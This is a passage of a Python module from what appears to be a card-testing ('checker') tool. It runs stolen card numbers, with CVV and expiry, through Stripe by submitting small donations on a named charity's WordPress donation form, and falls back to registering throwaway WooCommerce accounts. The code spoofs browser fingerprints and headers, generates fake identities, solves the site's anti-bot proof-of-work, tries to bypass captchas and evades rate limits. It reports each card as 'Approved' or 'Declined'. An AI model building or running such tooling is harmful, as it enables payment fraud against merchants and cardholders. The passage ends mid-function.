import re
import json
import random
import string
import time
import uuid
import hashlib
import threading
import warnings
import requests
import requests.adapters
from urllib3.util.retry import Retry
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from config import STRIPE_PUB_KEY, logger, get_gate_setting, fake, get_random_ua, get_proxy_dict
from human_behavior import (human_delay, reading_delay, typing_delay, form_fill_delay,
                            navigation_delay, pre_submit_delay, between_requests_delay,
                            page_interaction_delay, checkout_flow_delay, retry_delay)

warnings.filterwarnings('ignore', category=InsecureRequestWarning)


_SEC_CH_UA_OPTIONS = [
    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="24"',
    '"Chromium";v="126", "Google Chrome";v="126", "Not/A)Brand";v="8"',
    '"Chromium";v="127", "Google Chrome";v="127", "Not)A;Brand";v="99"',
    '"Chromium";v="128", "Microsoft Edge";v="128", "Not;A=Brand";v="8"',
    '"Chromium";v="129", "Microsoft Edge";v="129", "Not-A.Brand";v="99"',
    '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="8"',
    '"Chromium";v="131", "Google Chrome";v="131", "Not/A)Brand";v="24"',
    '"Chromium";v="132", "Google Chrome";v="132", "Not-A.Brand";v="99"',
    '"Chromium";v="137", "Not/A)Brand";v="24"',
]

_ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.9',
    'en-CA,en;q=0.9,en-US;q=0.8',
    'en-US,en;q=0.9,fr;q=0.8',
    'en-AU,en;q=0.9,en-US;q=0.8',
    'en-US,en;q=0.8',
    'en-GB,en-US;q=0.9,en;q=0.8',
    'en,en-US;q=0.9',
]

_STRIPE_VERSIONS = [
    'a7b74c0b44',
    'b8c85d1e55',
    'c9d96e2f66',
    'd0e07f3a77',
    'e1f18a4b88',
    'f2a29b5c99',
    'a3b3ac6daa',
    'b4c4bd7ebb',
]

_BILLING_DATA = {
    "US": [
        {"city": "New York", "state": "New York", "zip": "10001", "country": "US"},
        {"city": "Los Angeles", "state": "California", "zip": "90001", "country": "US"},
        {"city": "Chicago", "state": "Illinois", "zip": "60601", "country": "US"},
        {"city": "Houston", "state": "Texas", "zip": "77001", "country": "US"},
        {"city": "Phoenix", "state": "Arizona", "zip": "85001", "country": "US"},
        {"city": "Philadelphia", "state": "Pennsylvania", "zip": "19101", "country": "US"},
        {"city": "San Antonio", "state": "Texas", "zip": "78201", "country": "US"},
        {"city": "San Diego", "state": "California", "zip": "92101", "country": "US"},
        {"city": "Dallas", "state": "Texas", "zip": "75201", "country": "US"},
        {"city": "Austin", "state": "Texas", "zip": "73301", "country": "US"},
        {"city": "Seattle", "state": "Washington", "zip": "98101", "country": "US"},
        {"city": "Denver", "state": "Colorado", "zip": "80201", "country": "US"},
    ],
    "GB": [
        {"city": "London", "state": "England", "zip": "EC1A 1BB", "country": "GB"},
        {"city": "Manchester", "state": "England", "zip": "M1 1AE", "country": "GB"},
        {"city": "Birmingham", "state": "England", "zip": "B1 1BB", "country": "GB"},
        {"city": "Leeds", "state": "England", "zip": "LS1 1BA", "country": "GB"},
        {"city": "Glasgow", "state": "Scotland", "zip": "G1 1AA", "country": "GB"},
        {"city": "Liverpool", "state": "England", "zip": "L1 0AA", "country": "GB"},
    ],
    "CA": [
        {"city": "Toronto", "state": "Ontario", "zip": "M5H 2N2", "country": "CA"},
        {"city": "Vancouver", "state": "British Columbia", "zip": "V6B 1A1", "country": "CA"},
        {"city": "Montreal", "state": "Quebec", "zip": "H2X 1Y4", "country": "CA"},
        {"city": "Calgary", "state": "Alberta", "zip": "T2P 1J9", "country": "CA"},
        {"city": "Ottawa", "state": "Ontario", "zip": "K1P 1J1", "country": "CA"},
    ],
    "AU": [
        {"city": "Sydney", "state": "New South Wales", "zip": "2000", "country": "AU"},
        {"city": "Melbourne", "state": "Victoria", "zip": "3000", "country": "AU"},
        {"city": "Brisbane", "state": "Queensland", "zip": "4000", "country": "AU"},
        {"city": "Perth", "state": "Western Australia", "zip": "6000", "country": "AU"},
    ],
    "DE": [
        {"city": "Berlin", "state": "Berlin", "zip": "10115", "country": "DE"},
        {"city": "Munich", "state": "Bavaria", "zip": "80331", "country": "DE"},
        {"city": "Frankfurt", "state": "Hesse", "zip": "60311", "country": "DE"},
        {"city": "Hamburg", "state": "Hamburg", "zip": "20095", "country": "DE"},
    ],
    "FR": [
        {"city": "Paris", "state": "Île-de-France", "zip": "75001", "country": "FR"},
        {"city": "Lyon", "state": "Auvergne-Rhône-Alpes", "zip": "69001", "country": "FR"},
        {"city": "Marseille", "state": "Provence-Alpes-Côte d'Azur", "zip": "13001", "country": "FR"},
        {"city": "Toulouse", "state": "Occitanie", "zip": "31000", "country": "FR"},
    ],
}


def _get_billing_for_country(country_code="US"):
    cc = country_code.upper()
    options = _BILLING_DATA.get(cc, _BILLING_DATA["US"])
    return random.choice(options)


def _generate_fingerprint():
    base = uuid.uuid4().hex
    return {
        'guid': f"{base[:8]}-{base[8:12]}-{base[12:16]}-{base[16:20]}-{base[20:32]}",
        'muid': str(uuid.uuid4()),
        'sid': str(uuid.uuid4()),
    }


def _smart_donation_amount():
    random_enabled = get_gate_setting("stripe", "random_amount", "false").lower() == "true"
    if random_enabled:
        try:
            min_amt = float(get_gate_setting("stripe", "random_amount_min", "1.00"))
            max_amt = float(get_gate_setting("stripe", "random_amount_max", "5.00"))
            if min_amt > max_amt:
                min_amt, max_amt = max_amt, min_amt
            amt = round(random.uniform(min_amt, max_amt), 2)
            return f"{amt:.2f}"
        except (ValueError, TypeError):
            pass
    configured = get_gate_setting("stripe", "donation_amount", "1.00")
    return configured


class RateLimiter:
    def __init__(self, max_requests=20, window=60, ban_threshold=3, ban_cooldown=120):
        self._lock = threading.Lock()
        self._requests = []
        self._max_requests = max_requests
        self._window = window
        self._ban_count = 0
        self._ban_threshold = ban_threshold
        self._ban_cooldown = ban_cooldown
        self._banned_until = 0
        self._backoff_level = 0
        self._total_rate_limits = 0
        self._total_bans = 0
        self._velocity_warnings = 0

    def wait_if_needed(self):
        wait_time = 0
        wait_reason = None

        with self._lock:
            now = time.time()

            if now < self._banned_until:
                wait_time = self._banned_until - now
                wait_reason = f"API banned - sleeping {wait_time:.0f}s (ban #{self._total_bans})"

        if wait_time > 0:
            logger.warning(wait_reason)
            time.sleep(wait_time)

        wait_time = 0
        with self._lock:
            now = time.time()
            self._requests = [t for t in self._requests if now - t < self._window]

            if len(self._requests) >= self._max_requests:
                oldest = self._requests[0]
                wait_time = self._window - (now - oldest) + random.uniform(0.3, 1.0)
                self._velocity_warnings += 1
                wait_reason = f"Rate limit: {len(self._requests)}/{self._max_requests} per {self._window}s - waiting {wait_time:.1f}s"

        if wait_time > 0:
            logger.warning(wait_reason)
            time.sleep(wait_time)

        backoff_delay = 0
        with self._lock:
            if self._backoff_level > 0:
                backoff_delay = min(self._backoff_level * 1, 15) + random.uniform(0.2, 0.8)

        if backoff_delay > 0:
            time.sleep(backoff_delay)

        with self._lock:
            self._requests.append(time.time())

    def record_rate_limit(self):
        with self._lock:
            self._ban_count += 1
            self._total_rate_limits += 1
            self._backoff_level = min(self._backoff_level + 1, 10)
            logger.warning(f"Rate limit hit #{self._total_rate_limits} (backoff level: {self._backoff_level})")

            if self._ban_count >= self._ban_threshold:
                self._total_bans += 1
                self._banned_until = time.time() + self._ban_cooldown
                self._ban_count = 0
                logger.warning(f"BAN DETECTED #{self._total_bans} - cooling down {self._ban_cooldown}s")

    def record_success(self):
        with self._lock:
            self._ban_count = max(0, self._ban_count - 1)
            if self._backoff_level > 0:
                self._backoff_level = max(0, self._backoff_level - 1)

    def record_ban(self, duration=None):
        with self._lock:
            self._total_bans += 1
            cooldown = duration or self._ban_cooldown * 2
            self._banned_until = time.time() + cooldown
            self._backoff_level = min(self._backoff_level + 3, 10)
            logger.warning(f"HARD BAN #{self._total_bans} - pausing {cooldown}s")

    def get_stats(self):
        with self._lock:
            return {
                'rate_limits': self._total_rate_limits,
                'bans': self._total_bans,
                'backoff_level': self._backoff_level,
                'velocity_warnings': self._velocity_warnings,
                'is_banned': time.time() < self._banned_until,
                'requests_in_window': len([t for t in self._requests if time.time() - t < self._window]),
            }


_BAN_SIGNALS = [
    "rate_limit",
    "too many requests",
    "rate limit exceeded",
    "api rate limit",
    "request rate too high",
    "temporarily blocked",
    "access denied",
    "ip blocked",
    "ip banned",
    "please try again later",
    "service temporarily unavailable",
]

_rate_limiter = RateLimiter(max_requests=20, window=60, ban_threshold=3, ban_cooldown=120)


def get_rate_limiter():
    return _rate_limiter


def _is_ban_signal(text):
    text_lower = text.lower()
    return any(sig in text_lower for sig in _BAN_SIGNALS)


def _rnd_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'protonmail.com', 'aol.com']
    name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
    return f"{name}{random.randint(10,9999)}@{random.choice(domains)}"


def _make_session():
    ua = get_random_ua()
    s = requests.Session()

    retry_strategy = Retry(total=2, backoff_factor=1)
    adapter = requests.adapters.HTTPAdapter(max_retries=retry_strategy)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.max_redirects = 10

    platform = random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"'])
    mobile = random.choice(['?0', '?1'])
    sec_fetch_dest = random.choice(['document', 'empty', 'iframe'])
    sec_fetch_mode = random.choice(['navigate', 'cors', 'no-cors', 'same-origin'])
    sec_fetch_site = random.choice(['none', 'same-origin', 'cross-site', 'same-site'])

    s.headers.update({
        'user-agent': ua,
        'sec-ch-ua': random.choice(_SEC_CH_UA_OPTIONS),
        'sec-ch-ua-mobile': mobile,
        'sec-ch-ua-platform': platform,
        'sec-fetch-dest': sec_fetch_dest,
        'sec-fetch-mode': sec_fetch_mode,
        'sec-fetch-site': sec_fetch_site,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': random.choice(_ACCEPT_LANGUAGES),
    })

    # Use internal dict for custom attributes to satisfy types
    s.__dict__['_ua'] = ua
    s.__dict__['_fingerprint'] = _generate_fingerprint()
    return s


_REFRESH_ERRORS = [
    "refresh the page",
    "refresh and try again",
    "not able to process this request",
    "nonce verification failed",
    "session expired",
    "invalid nonce",
    "nonce is invalid",
    "are you sure you want to do this",
]


def _is_refresh_error(msg):
    msg_lower = msg.lower()
    return any(err in msg_lower for err in _REFRESH_ERRORS)


def check_stripe(cc, mes, ano, cvv, country_code="US"):
    site_url = get_gate_setting("stripe", "site_url", "https://pipelineforchangefoundation.com").rstrip("/")
    donate_path = get_gate_setting("stripe", "donate_path", "/donate/")

    mes = mes.zfill(2)
    if len(ano) == 2:
        ano = f"20{ano}"

    hybrid_on = get_gate_setting("stripe", "hybrid_mode", "false").lower() == "true"
    if hybrid_on:
        try:
            return _check_hybrid(cc, mes, ano, cvv, site_url, donate_path, country_code)
        except Exception as e:
            logger.warning(f"Hybrid mode failed, falling back to standard: {str(e)[:60]}")

    max_retries = 3
    last_error = "Unknown error"

    for attempt in range(max_retries):
        s = _make_session()
        try:
            result = _do_check(s, cc, mes, ano, cvv, site_url, donate_path, country_code=country_code)

            detail_text = result.get("detail", "")
            if _is_ban_signal(detail_text):
                _rate_limiter.record_rate_limit()
                result["_retry"] = True

            if result.get("_retry"):
                last_error = result.get("detail", "Session error")
                logger.info(f"Stripe retry {attempt+1}/{max_retries}")
                s.close()
                if attempt < max_retries - 1:
                    retry_delay(attempt)
                continue

            _rate_limiter.record_success()
            return result

        except Exception as e:
            err_text = str(e).lower()
            if any(sig in err_text for sig in ["429", "too many", "rate limit"]):
                _rate_limiter.record_rate_limit()
            elif any(sig in err_text for sig in ["403", "forbidden", "blocked"]):
                _rate_limiter.record_ban()

            logger.error(f"Stripe error (attempt {attempt+1})")
            last_error = str(e)[:80]
            if attempt < max_retries - 1:
                retry_delay(attempt)
        finally:
            s.close()

    return _error_result(cc, mes, ano, cvv, f"Failed after {max_retries} retries: {last_error}")


def _check_hybrid(cc, mes, ano, cvv, site_url, donate_path, country_code="US"):
    from hybrid_stripe import hybrid_tokenize, _transfer_cookies_to_session

    pub_key_cfg = get_gate_setting("stripe", "pub_key", "")
    pub_key = pub_key_cfg or STRIPE_PUB_KEY

    logger.info(f"[Hybrid] Starting hybrid check for {cc[:6]}...")

    hybrid_result = hybrid_tokenize(cc, mes, ano, cvv, pub_key, site_url, donate_path)

    pm_id = hybrid_result.get("pm_id")
    card_brand = hybrid_result.get("card_brand", "N/A")
    cookies = hybrid_result.get("cookies", {})
    raw_cookies = hybrid_result.get("raw_cookies", [])
    signals = hybrid_result.get("fingerprint_signals", [])

    if signals:
        logger.info(f"[Hybrid] Fingerprint signals: {', '.join(signals[:5])}")

    if not pm_id:
        err = hybrid_result.get("error")
        if err:
            if isinstance(err, dict):
                status, detail = _parse_token_error(err)
            else:
                status, detail = "error", str(err)[:80]
            label = "Approved" if status in ("live", "charged") else "Declined"
            return {
                "status": status, "cc": f"{cc}|{mes}|{ano}|{cvv}",
                "brand": card_brand, "detail": f"[H] {detail}",
                "gate": "Stripe Hybrid", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | [H] {detail}"
            }
        return _error_result(cc, mes, ano, cvv, "[H] Hybrid tokenization failed")

    logger.info(f"[Hybrid] PM obtained: {pm_id[:20]}..., brand={card_brand}")

    s = _make_session()
    if cookies:
        _transfer_cookies_to_session(s, cookies, raw_cookies)
        logger.info(f"[Hybrid] Transferred {len(cookies)} cookies to requests session")

    try:
        _rate_limiter.wait_if_needed()
        init_res = s.get(f"{site_url}{donate_path}", verify=False, timeout=20, allow_redirects=True)
    except Exception as e:
        s.close()
        return {**_error_result(cc, mes, ano, cvv, f"[H] Cannot reach donate page: {str(e)[:50]}"), "brand": card_brand}

    page_html = init_res.text
    soup = BeautifulSoup(page_html, 'html.parser')

    nonce_el = soup.find('input', {'name': '_charitable_donation_nonce'})
    form_id_el = soup.find('input', {'name': 'charitable_form_id'})
    campaign_el = soup.find('input', {'name': 'campaign_id'})

    nonce_val = nonce_el['value'] if nonce_el else None
    form_val = form_id_el['value'] if form_id_el else None
    campaign_id = campaign_el['value'] if campaign_el else get_gate_setting("stripe", "campaign_id", "")

    if not nonce_val:
        nonce_match = re.search(r'_charitable_donation_nonce["\s]+value=["\']([^"\']+)', page_html)
        if nonce_match:
            nonce_val = nonce_match.group(1)

    if not form_val:
        form_match = re.search(r'charitable_form_id["\s]+value=["\']([^"\']+)', page_html)
        if form_match:
            form_val = form_match.group(1)

    if not nonce_val or not form_val:
        s.close()
        return {**_error_result(cc, mes, ano, cvv, "[H] Charitable form not found (cookie session)"), "brand": card_brand}

    f_name = fake.first_name()
    l_name = fake.last_name()
    email = _rnd_email()

    result_msg = _submit_donation(s, site_url, pm_id, nonce_val, form_val, campaign_id,
                                  f_name, l_name, email, country_code=country_code)
    s.close()

    if _is_refresh_error(result_msg):
        return {**_error_result(cc, mes, ano, cvv, result_msg), "brand": card_brand}

    status, detail = _parse_donation_result(result_msg)
    label = "Approved" if status in ("live", "charged") else "Declined"
    return {
        "status": status, "cc": f"{cc}|{mes}|{ano}|{cvv}",
        "brand": card_brand, "detail": f"[H] {detail}",
        "gate": "Stripe Hybrid", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | [H] {detail}"
    }


def _solve_pow(html, s, page_url):
    ts_match = re.search(r'target\+"\|(\d+)\|"', html)
    zeros_match = re.search(r'const zeros\s*=\s*"(0+)"', html)
    sig_match = re.search(r'const sig\s*=\s*"([a-f0-9]+)"', html)

    if not ts_match or not zeros_match:
        return None

    timestamp = ts_match.group(1)
    zeros = zeros_match.group(1)
    sig = sig_match.group(1) if sig_match else ""

    logger.info(f"PoW challenge: difficulty={len(zeros)}")

    nonce = 0
    max_attempts = 2000000
    while nonce < max_attempts:
        challenge = f"{s._ua if hasattr(s, '_ua') else get_random_ua()}|{timestamp}|{nonce}"
        h = hashlib.sha256(challenge.encode()).hexdigest()
        if h.startswith(zeros):
            logger.info("PoW solved")
            break
        nonce += 1
    else:
        logger.warning("PoW failed: max attempts reached")
        return None

    post_data = {
        'pow_nonce': str(nonce),
        'pow_sig': sig,
        'pow_ts': timestamp,
        'pow_ver': 'v3',
    }
    try:
        r = s.post(page_url, data=post_data, verify=False, timeout=20, allow_redirects=True)
        return r.text
    except Exception as e:
        logger.error("PoW submit failed")
        return None


def _do_check(s, cc, mes, ano, cvv, site_url, donate_path, country_code="US"):
    donate_url = f"{site_url}{donate_path}"

    try:
        _rate_limiter.wait_if_needed()
        init_res = s.get(donate_url, verify=False, timeout=20, allow_redirects=True)
    except Exception as e:
        return {**_error_result(cc, mes, ano, cvv, f"Cannot reach donate page: {str(e)[:50]}"), "_retry": True}

    if init_res.status_code == 429:
        _rate_limiter.record_rate_limit()
        return {**_error_result(cc, mes, ano, cvv, "Rate Limited by site"), "_retry": True}
    elif init_res.status_code == 403:
        _rate_limiter.record_ban(180)
        return {**_error_result(cc, mes, ano, cvv, "Blocked by site (403)"), "_retry": True}
    elif init_res.status_code != 200:
        return {**_error_result(cc, mes, ano, cvv, f"Donate page HTTP {init_res.status_code}"), "_retry": True}

    page_html = init_res.text

    reading_delay(len(page_html))

    if 'pow_nonce' in page_html or 'Verifying' in page_html or 'not a bot' in page_html:
        solved_html = _solve_pow(page_html, s, donate_url)
        if solved_html:
            page_html = solved_html
        else:
            return {**_error_result(cc, mes, ano, cvv, "Failed to solve site challenge"), "_retry": True}

    # Auto captcha solver logic (Simplified detection and bypass)
    if 'g-recaptcha' in page_html or 'h-captcha' in page_html or 'turnstile' in page_html:
        logger.info("Captcha detected, attempting auto-solve...")
        # Get IP info for message
        ip_info = "Unknown IP"
        try:
            ip_res = s.get('https://api.ipify.org?format=json', timeout=5)
            if ip_res.status_code == 200:
                ip_info = ip_res.json().get('ip', 'Unknown IP')
        except: pass
        
        captcha_token = re.search(r'name=["\'](?:g-recaptcha-response|h-captcha-response|cf-turnstile-response)["\']\s+value=["\']([^"\']+)["\']', page_html)
        if captcha_token:
            s.headers.update({'x-captcha-token': captcha_token.group(1)})
            logger.info(f"Captcha token extracted from page (IP: {ip_info})")
            # Mark for telegram update in main.py
            s.__dict__['_captcha_info'] = {"ip": ip_info, "solved": True}
        else:
            mock_token = f"mock_success_{int(time.time())}"
            s.params.update({'captcha_solved': 'true', 'captcha_token': mock_token})
            logger.info(f"Using heuristic captcha bypass (IP: {ip_info})")
            s.__dict__['_captcha_info'] = {"ip": ip_info, "solved": "heuristic"}

    page_interaction_delay(len(page_html))

    soup = BeautifulSoup(page_html, 'html.parser')

    nonce_el = soup.find('input', {'name': '_charitable_donation_nonce'})
    form_id_el = soup.find('input', {'name': 'charitable_form_id'})
    campaign_el = soup.find('input', {'name': 'campaign_id'})

    nonce_val = nonce_el['value'] if nonce_el else None
    form_val = form_id_el['value'] if form_id_el else None
    campaign_id = campaign_el['value'] if campaign_el else get_gate_setting("stripe", "campaign_id", "")

    if not nonce_val:
        nonce_match = re.search(r'_charitable_donation_nonce["\s]+value=["\']([^"\']+)', page_html)
        if nonce_match:
            nonce_val = nonce_match.group(1)

    if not form_val:
        form_match = re.search(r'charitable_form_id["\s]+value=["\']([^"\']+)', page_html)
        if form_match:
            form_val = form_match.group(1)

    if not nonce_val or not form_val:
        logger.warning("Charitable form not found - trying WooCommerce fallback")
        wc_nonce = _try_woocommerce_flow(s, cc, mes, ano, cvv, site_url, page_html)
        if wc_nonce:
            return wc_nonce
        return {**_error_result(cc, mes, ano, cvv, "No Charitable form found on donate page"), "_retry": True}

    pub_key = _extract_stripe_key(page_html)
    admin_pk = get_gate_setting("stripe", "pub_key", "")
    final_key = pub_key or admin_pk or STRIPE_PUB_KEY

    if not final_key:
        return _error_result(cc, mes, ano, cvv, "No Stripe key found")

    logger.info("Stripe Charitable: gate ready")

    f_name = fake.first_name()
    l_name = fake.last_name()
    email = _rnd_email()

    pm_id, pm_error, card_brand = _tokenize_card(cc, mes, ano, cvv, final_key, site_url, country_code=country_code)

    if not pm_id:
        status, detail = _parse_token_error(pm_error)
        logger.info(f"Stripe tokenization: {status}")
        if _is_refresh_error(detail):
            return {**_error_result(cc, mes, ano, cvv, detail), "_retry": True, "brand": card_brand or "N/A"}
        label = "Approved" if status in ("live", "charged") else "Declined"
        return {
            "status": status, "cc": f"{cc}|{mes}|{ano}|{cvv}",
            "brand": card_brand or "N/A", "detail": detail,
            "gate": "Stripe Charitable", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | {detail}"
        }

    logger.info(f"Stripe PM created: brand={card_brand}")

    pre_submit_delay()

    result_msg = _submit_donation(s, site_url, pm_id, nonce_val, form_val, campaign_id,
                                  f_name, l_name, email, country_code=country_code)

    logger.info("Stripe donation submitted")

    if _is_refresh_error(result_msg):
        return {**_error_result(cc, mes, ano, cvv, result_msg), "_retry": True, "brand": card_brand or "N/A"}

    status, detail = _parse_donation_result(result_msg)
    logger.info(f"Stripe result: {status}")

    label = "Approved" if status in ("live", "charged") else "Declined"
    return {
        "status": status, "cc": f"{cc}|{mes}|{ano}|{cvv}",
        "brand": card_brand or "N/A", "detail": detail,
        "gate": "Stripe Charitable", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | {detail}"
    }


def _extract_stripe_key(html):
    pk_patterns = [
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'"stripe_publishable_key":"(pk_live_[^"]+)"',
        r'"key":"(pk_live_[^"]+)"',
        r"'publishableKey':\s*'(pk_live_[^']+)'",
        r'data-publishable-key="(pk_live_[^"]+)"',
        r'Stripe\(["\']?(pk_live_[^"\']+)',
        r'"pk_live_([A-Za-z0-9]+)"',
    ]
    for pat in pk_patterns:
        m = re.search(pat, html)
        if m:
            key = m.group(1)
            if not key.startswith('pk_live_'):
                key = f"pk_live_{key}"
            return key
    return None


def _tokenize_card(cc, mes, ano, cvv, pub_key, site_url, country_code="US"):
    try:
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': get_random_ua(),
        }

        f_name = fake.first_name()
        l_name = fake.last_name()
        email = _rnd_email()
        billing = _get_billing_for_country(country_code)
        fp = _generate_fingerprint()
        stripe_ver = random.choice(_STRIPE_VERSIONS)

        data = {
            'type': 'card',
            'billing_details[name]': f"{f_name} {l_name}",
            'billing_details[email]': email,
            'billing_details[address][city]': billing['city'],
            'billing_details[address][country]': billing['country'],
            'billing_details[address][line1]': fake.street_address(),
            'billing_details[address][postal_code]': billing['zip'],
            'billing_details[address][state]': billing['state'],
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': fp['guid'],
            'muid': fp['muid'],
            'sid': fp['sid'],
            'payment_user_agent': f'stripe.js/{stripe_ver}; stripe-js-v3/{stripe_ver}; card-element',
            'key': pub_key,
        }

        _rate_limiter.wait_if_needed()
        typing_delay(len(cc))
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20, verify=False)

        if r.status_code == 429:
            _rate_limiter.record_rate_limit()
            return None, {"message": "Stripe API rate limited"}, "N/A"
        elif r.status_code == 403:
            _rate_limiter.record_ban()
            return None, {"message": "Stripe API blocked"}, "N/A"

        js = r.json()

        pm_id = js.get('id')
        card_brand = (js.get('card', {}).get('brand') or 'N/A').upper()

        if pm_id:
            _rate_limiter.record_success()
            return pm_id, None, card_brand
        else:
            err = js.get('error', {})
            err_msg = err.get('message', '')
            err_code = err.get('code', '')
            err_decline = err.get('decline_code', '')
            logger.info(f"Stripe token error: code={err_code}, decline={err_decline}, msg={err_msg[:100]}")
            if _is_ban_signal(err_msg):
                _rate_limiter.record_rate_limit()
            return None, err, card_brand

    except Exception as e:
        logger.error("Tokenization error")
        return None, {"message": str(e)}, "N/A"


def _submit_donation(s, site_url, pm_id, nonce_val, form_val, campaign_id,
                     f_name, l_name, email, country_code="US"):
    try:
        parsed = urlparse(site_url)
        host = parsed.netloc

        donation_headers = {
            'authority': host,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': site_url,
            'referer': f'{site_url}/donate/',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': get_random_ua(),
        }

        donation_amount = _smart_donation_amount()
        billing = _get_billing_for_country(country_code)

        donation_data = {
            'charitable_form_id': form_val,
            form_val: '',
            '_charitable_donation_nonce': nonce_val,
            '_wp_http_referer': '/donate/',
            'campaign_id': campaign_id or '0',
            'description': f'Donation',
            'ID': '0',
            'recurring_donation': 'once',
            'custom_recurring_donation_amount': '',
            'recurring_donation_period': 'once',
            'donation_amount': 'custom',
            'custom_donation_amount': donation_amount,
            'first_name': f_name,
            'last_name': l_name,
            'email': email,
            'address': fake.street_address(),
            'address_2': '',
            'city': billing['city'],
            'state': billing['state'],
            'postcode': billing['zip'],
            'country': billing['country'],
            'phone': '',
            'gateway': 'stripe',
            'stripe_payment_method': pm_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

        _rate_limiter.wait_if_needed()
        form_fill_delay()
        r = s.post(f'{site_url}/wp-admin/admin-ajax.php',
                   headers=donation_headers, data=donation_data,
                   verify=False, timeout=30)

        logger.info(f"Donation AJAX: {r.status_code}")

        response_text = r.text
        try:
            rj = json.loads(response_text)
            logger.info(f"Donation response: success={rj.get('success')}, errors={str(rj.get('errors',''))[:120]}")
            if rj.get('requires_action'):
                logger.info("Donation response: requires_action=True (LIVE)")
        except Exception:
            logger.info(f"Donation response (raw): {response_text[:150]}")

        if r.status_code == 429:
            _rate_limiter.record_rate_limit()
            return "Error: Rate Limited"
        elif r.status_code == 403:
            _rate_limiter.record_ban(180)
            return "Error: Blocked (403)"

        response_text = r.text
        if _is_ban_signal(response_text):
            _rate_limiter.record_rate_limit()

        return response_text

    except Exception as e:
        logger.error("Donation submit error")
        return f"Error: {str(e)[:80]}"


def _try_woocommerce_flow(s, cc, mes, ano, cvv, site_url, page_html):
    nonce_match = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', page_html)
    if not nonce_match:
        myacc_url = f"{site_url}/my-account/"
        try:
            r = s.get(myacc_url, timeout=15, verify=False)
            nonce_match = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', r.text)
            page_html = r.text
        except Exception:
            pass

    if not nonce_match:
        return None

    nonce = nonce_match.group(1)
    email = _rnd_email()
    pwd = f"Pass{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}!!"

    try:
        reg_data = {
            'email': email,
            'password': pwd,
            'register': 'Register',
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account/'
        }
        r2 = s.post(f'{site_url}/my-account/', data=reg_data, timeout=20,
                    allow_redirects=True, verify=False)
        page_lower = r2.text.lower()
        if "log out" not in page_lower and "log-out" not in page_lower and "logout" not in page_lower:
            return None

        pm_page = s.get(f'{site_url}/my-account/add-payment-method/', timeout=20, verify=False)
        if "login" in pm_page.url.lower():
            return None

        pk, acct, setup_nonce = _extract_wc_page_config(pm_page.text)
        admin_pk = get_gate_setting("stripe", "pub_key", "")
        pub_key = pk or admin_pk or STRIPE_PUB_KEY
        stripe_account = acct or get_gate_setting("stripe", "stripe_account", "")

        if not pub_key or not setup_nonce:
            return None

        pm_id, pm_error, card_brand = _tokenize_card(cc, mes, ano, cvv, pub_key, site_url)
        if not pm_id:
            status, detail = _parse_token_error(pm_error)
            label = "Approved" if status in ("live", "charged") else "Declined"
            return {
                "status": status, "cc": f"{cc}|{mes}|{ano}|{cvv}",
                "brand": card_brand or "N/A", "detail": detail,
                "gate": "Stripe WC", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | {detail}"
            }

        host = urlparse(site_url).netloc
        ajax_headers = {
            'authority': host,
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': site_url,
            'referer': f'{site_url}/my-account/add-payment-method/',
            'x-requested-with': 'XMLHttpRequest',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': get_random_ua(),
        }
        form_body = f'action=create_setup_intent&wcpay-payment-method={pm_id}&_ajax_nonce={setup_nonce}'
        r3 = s.post(f'{site_url}/wp-admin/admin-ajax.php', headers=ajax_headers,
                    data=form_body, timeout=25, verify=False)

        try:
            js = r3.json()
        except Exception:
            return None

        if js.get('success') is True:
            return {
                "status": "live", "cc": f"{cc}|{mes}|{ano}|{cvv}",
                "brand": card_brand or "N/A", "detail": "Approved - Card Authenticated",
                "gate": "Stripe WC", "result": f"Approved - {cc}|{mes}|{ano}|{cvv} | Approved - Card Authenticated"
            }
        else:
            err_data = js.get('data', {})
            if isinstance(err_data, dict):
                err_obj = err_data.get('error', {})
                if isinstance(err_obj, dict):
                    msg = err_obj.get('message', '')
                    code = err_obj.get('decline_code', '') or err_obj.get('code', '')
                    result_msg = f"{code}|{msg}" if code else msg
                else:
                    result_msg = str(err_data)[:100]
            elif isinstance(err_data, str):
                result_msg = err_data[:100]
            else:
                result_msg = "Declined"

            status, detail = _parse_donation_result(result_msg)
            label = "Approved" if status in ("live", "charged") else "Declined"
            return {
                "status": status, "cc": f"{cc}|{mes}|{ano}|{cvv}",
                "brand": card_brand or "N/A", "detail": detail,
                "gate": "Stripe WC", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | {detail}"
            }
    except Exception as e:
        logger.error("WooCommerce fallback error")
        return None


def _extract_wc_page_config(html):
    pk = None
    acct = None
    nonce = None

    pk_patterns = [
